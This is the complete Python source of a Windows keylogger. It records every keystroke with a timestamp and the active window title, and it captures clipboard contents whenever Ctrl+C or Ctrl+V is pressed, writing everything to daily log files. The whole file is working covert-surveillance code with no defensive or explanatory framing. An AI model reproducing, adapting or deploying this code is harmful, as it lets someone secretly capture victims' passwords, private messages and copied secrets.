from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
from pynput import keyboard
import win32clipboard
import threading
import time

KEYSTROKES = []
KEY_TIMEOUT = 3
LAST_KEYSTROKE = time.time()

def log_text(text: str):
    filename = f"{datetime.now().strftime('%m-%d-%Y')}.txt"
    date = datetime.now().strftime("%H:%M:%S")

    active_window = GetWindowText(GetForegroundWindow())

    with open(filename, "ab") as logfile:
        logfile.write(f"[{date}][{active_window}]\n{text}\n\n".encode())
        logfile.close()
    
    return

def keystrokes_log():
    keystrokes = "".join(KEYSTROKES)
    KEYSTROKES.clear()

    log_text(keystrokes)

def logger_handler():
    while True:
        time.sleep(0.05)

        if all([(time.time() - LAST_KEYSTROKE) >= KEY_TIMEOUT, KEYSTROKES]):
            keystrokes_log()

def on_clipboard_set():
    time.sleep(0.1)

    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    log_text(f"Clipboard Set: ```{data}```")

def on_clipboard_pasted():
    time.sleep(0.1)

    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    log_text(f"Clipboard Pasted: ```{data}```")

def on_press(key):
    global LAST_KEYSTROKE

    match type(key):
        case keyboard.Key:
            if key.name == "space":
                key_str = " "
            
            elif key.name in ["shift", "shift_r"]:
                return
            
            else:
                key_str = f"<{key.name}>"

        case keyboard.KeyCode:
            key_str = f"{key.char}"
        
    KEYSTROKES.append(key_str)
    LAST_KEYSTROKE = time.time()

    # Keys that will trigger functions
    match type(key):
        case keyboard.Key:
            if key.name == "enter":
                threading.Thread(target=keystrokes_log, daemon=True).start()
        
        case keyboard.KeyCode:
            if key.char == "\x03":
                threading.Thread(target=on_clipboard_set, daemon=True).start()
            
            elif key.char == "\x16":
                threading.Thread(target=on_clipboard_pasted, daemon=True).start()

def main():
    threading.Thread(target=logger_handler, daemon=True).start()
    listener = keyboard.Listener(on_press=on_press)
    listener.run()

if __name__ == "__main__":
    main()
